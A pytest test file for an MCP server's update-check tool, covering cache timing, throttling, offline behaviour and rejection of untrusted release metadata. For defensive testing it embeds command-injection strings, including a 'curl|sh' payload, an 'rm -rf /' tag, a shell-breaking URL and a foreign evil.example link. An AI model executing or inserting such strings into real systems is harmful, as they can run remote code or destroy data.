import json
import sqlite3
import time

import httpx
import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError
from fastmcp.server.auth.providers.jwt import RSAKeyPair
from test_server import Recorder, config, connection, token

from zai_topvisor import __version__, update_check
from zai_topvisor.agent_profile import PROFILE
from zai_topvisor.policy import PolicyStore
from zai_topvisor.server import create_server

TOOL = "topvisor_check_update"
RELEASE = {
    "tag_name": "v99.0.0",
    "html_url": "https://github.com/zai-one/topvisor-mcp/releases/tag/v99.0.0",
    "draft": False,
    "prerelease": False,
}


REAL_FETCH = update_check.fetch_latest_release
INJECTION = 'v9.9.9";curl${IFS}x|sh;"'
NETWORK_CALLS = []


def no_network():
    NETWORK_CALLS.append(1)
    raise AssertionError("network must not be used")


@pytest.fixture(autouse=True)
def enabled(monkeypatch):
    monkeypatch.delenv(update_check.ENV_DISABLE, raising=False)
    # Default fetcher is resolved at call time, so this guard really covers every code path.
    monkeypatch.setattr(update_check, "fetch_latest_release", no_network)
    NETWORK_CALLS.clear()
    yield
    assert NETWORK_CALLS == [], "unexpected network fetch"


class Counter:
    def __init__(self, result=None):
        self.calls, self.result = 0, result

    def __call__(self):
        self.calls += 1
        if self.result is None:
            raise httpx.ConnectError("offline")
        return self.result


def test_newer_release_suggests_matching_install_command(tmp_path):
    cache = tmp_path / "update-check.json"
    result = update_check.check_update(cache, fetch=lambda: RELEASE, now=1000.0)
    assert result["update_available"] is True
    assert result["current_version"] == __version__
    assert result["latest_version"] == "99.0.0"
    assert result["release_url"] == RELEASE["html_url"]
    assert result["update_command"] == (
        'uv tool install --force "zai-topvisor-mcp @ https://github.com/zai-one/topvisor-mcp/releases/'
        'download/v99.0.0/zai_topvisor_mcp-99.0.0-py3-none-any.whl"'
    )
    assert result["auto_update"] is False
    assert json.loads(cache.read_text())["latest_version"] == "99.0.0"


def test_cache_is_reused_for_a_day_and_refreshed_after(tmp_path):
    cache = tmp_path / "update-check.json"
    update_check.check_update(cache, fetch=lambda: RELEASE, now=1000.0)
    cached = update_check.check_update(cache, fetch=no_network, now=1000.0 + 3600)
    assert cached["source"] == "cache" and cached["update_available"] is True
    forced_too_soon = update_check.check_update(cache, force=True, fetch=no_network, now=1030.0)
    assert forced_too_soon["source"] == "cache"
    current = {**RELEASE, "tag_name": f"v{__version__}"}
    refreshed = update_check.check_update(cache, fetch=lambda: current, now=1000.0 + 25 * 3600)
    assert refreshed["source"] == "github"
    assert refreshed["update_available"] is False and refreshed["update_command"] is None


def test_offline_or_rate_limited_fails_gracefully(tmp_path):
    def offline():
        raise httpx.ConnectError("offline")

    cache = tmp_path / "update-check.json"
    result = update_check.check_update(cache, fetch=offline, now=1000.0)
    assert result["status"] == "unavailable" and result["update_available"] is None
    assert result["error"] == "ConnectError"
    update_check.check_update(cache, force=True, fetch=lambda: RELEASE, now=1100.0)
    stale = update_check.check_update(cache, fetch=offline, now=1100.0 + 30 * 3600)
    assert stale["last_known"]["latest_version"] == "99.0.0"


@pytest.mark.parametrize(
    "payload",
    [
        {"tag_name": "nightly"},
        {**RELEASE, "prerelease": True},
        {**RELEASE, "tag_name": "v1.0.0; rm -rf /"},
    ],
)
def test_untrusted_release_metadata_is_rejected(tmp_path, payload):
    result = update_check.check_update(tmp_path / "c.json", fetch=lambda: payload, now=1.0)
    assert result["status"] == "unavailable"
    assert json.loads((tmp_path / "c.json").read_text()) == {"attempted_at": 1.0, "attempt_failed": True}


def test_foreign_release_url_falls_back_to_repository(tmp_path):
    payload = {**RELEASE, "html_url": "https://evil.example/release"}
    result = update_check.check_update(tmp_path / "c.json", fetch=lambda: payload, now=1.0)
    assert result["release_url"] == "https://github.com/zai-one/topvisor-mcp/releases"


def test_env_opt_out_disables_network_and_hint(tmp_path, monkeypatch):
    cache = tmp_path / "update-check.json"
    update_check.check_update(cache, fetch=lambda: RELEASE, now=time.time())
    monkeypatch.setenv(update_check.ENV_DISABLE, "1")
    result = update_check.check_update(cache, force=True, fetch=no_network)
    assert result["enabled"] is False and result["status"] == "disabled"
    assert update_check.cached_hint(cache) is None
    assert update_check.refresh_in_background(cache) is None


def test_version_parsing():
    assert update_check.parse_version("v0.10.0") > update_check.parse_version("0.9.9")
    assert update_check.parse_version("1.2") == update_check.parse_version("v1.2.0")
    assert update_check.parse_version("1.2.3-rc1") is None


def test_fetch_uses_public_api_with_timeout(monkeypatch):
    seen = {}

    def fake_get(url, **kwargs):
        seen.update(url=url, **kwargs)
        return httpx.Response(200, json=RELEASE, request=httpx.Request("GET", url))

    monkeypatch.setattr(update_check.httpx, "get", fake_get)
    assert REAL_FETCH()["tag_name"] == "v99.0.0"
    assert seen["url"] == "https://api.github.com/repos/zai-one/topvisor-mcp/releases/latest"
    assert seen["timeout"] <= 5 and "Authorization" not in seen["headers"]


async def test_tool_and_startup_hint_use_cache_without_blocking(tmp_path, monkeypatch):
    settings = config(tmp_path, RSAKeyPair.generate())
    cache = settings.state_path.parent / update_check.CACHE_FILE
    update_check.check_update(cache, fetch=lambda: RELEASE, now=time.time())
    recorder = Recorder()
    server = create_server(settings, transport="stdio", http_factory=recorder.factory)
    assert "99.0.0 is available" in server.instructions
    assert TOOL in server.instructions
    async with Client(server) as client:
        tools = {tool.name: tool for tool in await client.list_tools()}
        assert tools[TOOL].annotations.readOnlyHint is True
        result = (await client.call_tool(TOOL, {})).data
    assert result["update_available"] is True and result["source"] == "cache"
    assert recorder.calls == []


def test_no_hint_without_cache(tmp_path):
    settings = config(tmp_path, RSAKeyPair.generate())
    assert create_server(settings, transport="stdio").instructions == PROFILE.router


def test_injected_tag_never_reaches_result_cache_or_instructions(tmp_path):
    cache = tmp_path / "update-check.json"
    url = f"{update_check.RELEASES_URL}/tag/{INJECTION}"
    payload = {**RELEASE, "tag_name": INJECTION, "html_url": url}
    result = update_check.check_update(cache, fetch=lambda: payload, now=1000.0)
    assert result["status"] == "unavailable" and "latest_version" not in result
    assert "curl" not in json.dumps(result) and "9.9.9" not in json.dumps(result)
    assert "curl" not in cache.read_text() and update_check.cached_hint(cache) is None
    # A tampered cache is treated as "no release" too.
    tampered = {"latest_version": INJECTION, "release_url": update_check.RELEASES_URL}
    cache.write_text(json.dumps({**tampered, "checked_at": 1e12}))
    assert update_check.cached_hint(cache) is None
    tampered_url = {"latest_version": "99.0", "release_url": f'{update_check.RELEASES_URL}/x"; sh'}
    cache.write_text(json.dumps({**tampered_url, "checked_at": time.time()}))
    assert update_check.cached_hint(cache) is None
    counter = Counter(RELEASE)
    assert update_check.check_update(cache, fetch=counter)["release_url"] == RELEASE["html_url"]
    assert counter.calls == 1


async def test_injected_cache_never_reaches_server_instructions(tmp_path):
    settings = config(tmp_path, RSAKeyPair.generate())
    cache = settings.state_path.parent / update_check.CACHE_FILE
    cache.parent.mkdir(parents=True, exist_ok=True)
    record = {"latest_version": INJECTION, "release_url": update_check.RELEASES_URL}
    cache.write_text(json.dumps({**record, "checked_at": time.time()}))
    assert create_server(settings, transport="stdio").instructions == PROFILE.router


def test_version_parsing_accepts_plain_ascii_tags_only():
    assert update_check.parse_version("v1.2.3.4") == (1, 2, 3, 4)
    for tag in ("v1.2.3.4.5", "1.2.3\n", "v\u0661.2", "V1.2", "1..2", "", None, 1):
        assert update_check.parse_version(tag) is None


def test_failed_fetch_is_cached_for_thirty_minutes(tmp_path):
    cache = tmp_path / "update-check.json"
    counter = Counter()
    for offset in (0, 10, 600, 1799):
        result = update_check.check_update(cache, fetch=counter, now=1000.0 + offset)
        assert result["status"] == "unavailable"
    assert counter.calls == 1
    update_check.check_update(cache, fetch=counter, now=1000.0 + 1800)
    assert counter.calls == 2


def test_failure_keeps_last_good_release(tmp_path):
    cache = tmp_path / "update-check.json"
    update_check.check_update(cache, fetch=lambda: RELEASE, now=1000.0)
    counter = Counter()
    later = 1000.0 + 25 * 3600
    first = update_check.check_update(cache, fetch=counter, now=later)
    second = update_check.check_update(cache, fetch=counter, now=later + 60)
    assert counter.calls == 1
    assert first["last_known"]["latest_version"] == second["last_known"]["latest_version"] == "99.0.0"
    assert second["error"] == "recent_attempt_failed"


@pytest.mark.parametrize("cached", [False, True])
def test_forced_refresh_is_throttled_to_once_a_minute(tmp_path, cached):
    cache = tmp_path / "update-check.json"
    counter = Counter(RELEASE if cached else None)
    for offset in (0, 1, 30, 59):
        update_check.check_update(cache, force=True, fetch=counter, now=1000.0 + offset)
    assert counter.calls == 1
    update_check.check_update(cache, force=True, fetch=counter, now=1060.0)
    assert counter.calls == 2


def test_background_refresh_obeys_the_same_rules(tmp_path, monkeypatch):
    cache = tmp_path / "update-check.json"
    counter = Counter()
    monkeypatch.setattr(update_check, "fetch_latest_release", counter)
    thread = update_check.refresh_in_background(cache)
    assert thread is not None
    thread.join(timeout=10)
    assert counter.calls == 1
    assert update_check.refresh_in_background(cache) is None  # failed moments ago
    update_check.check_update(cache, fetch=lambda: RELEASE)
    assert update_check.refresh_in_background(cache) is None  # fresh
    assert counter.calls == 1


def test_legacy_cache_without_attempt_time_is_still_read(tmp_path):
    cache = tmp_path / "update-check.json"
    legacy = {"latest_version": "99.0.0", "release_url": RELEASE["html_url"], "checked_at": 1000.0}
    cache.write_text(json.dumps(legacy))
    result = update_check.check_update(cache, force=True, fetch=no_network, now=1030.0)
    assert result["source"] == "cache" and result["latest_version"] == "99.0.0"


async def test_tool_goes_through_runtime_without_spending_topvisor_quota(tmp_path, monkeypatch):
    settings = config(tmp_path, RSAKeyPair.generate())
    counter = Counter(RELEASE)
    monkeypatch.setattr(update_check, "fetch_latest_release", counter)
    # An active Topvisor cooldown must neither block nor be extended by the update check.
    store = PolicyStore(settings.state_path, settings.account_id, 20, 20, 2)
    store.cooldown(600)
    recorder = Recorder()
    server = create_server(settings, transport="stdio", http_factory=recorder.factory)
    async with Client(server) as client:
        tools = {tool.name: tool for tool in await client.list_tools()}
        schema = {"force_refresh": {"default": False, "type": "boolean"}}
        assert tools[TOOL].inputSchema["properties"] == schema
        first = (await client.call_tool(TOOL, {"force_refresh": True})).data
        second = (await client.call_tool(TOOL, {"force_refresh": True})).data
    assert first["source"] == "github" and second["source"] == "cache"
    assert counter.calls == 1 and recorder.calls == []
    with sqlite3.connect(settings.state_path) as db:
        assert db.execute("SELECT actor, outcome FROM calls").fetchall() == [
            ("local-operator", "success"),
            ("local-operator", "success"),
        ]
        assert db.execute("SELECT COUNT(*) FROM attempts").fetchone()[0] == 0
        assert db.execute("SELECT COUNT(*) FROM leases").fetchone()[0] == 0
        (until,) = db.execute("SELECT until_time FROM cooldowns").fetchone()
    assert until < time.time() + 601


async def test_http_tool_requires_account_bound_identity(tmp_path):
    pair = RSAKeyPair.generate()
    settings = config(tmp_path, pair)
    cache = settings.state_path.parent / update_check.CACHE_FILE
    update_check.check_update(cache, fetch=lambda: RELEASE, now=time.time())
    server = create_server(settings)
    async with connection(server, token(pair, scopes=["topvisor:read"])) as client:
        assert (await client.call_tool(TOOL, {})).data["source"] == "cache"
    async with connection(server, token(pair, scopes=["topvisor:read"], account="other")) as client:
        with pytest.raises(ToolError):
            await client.call_tool(TOOL, {})
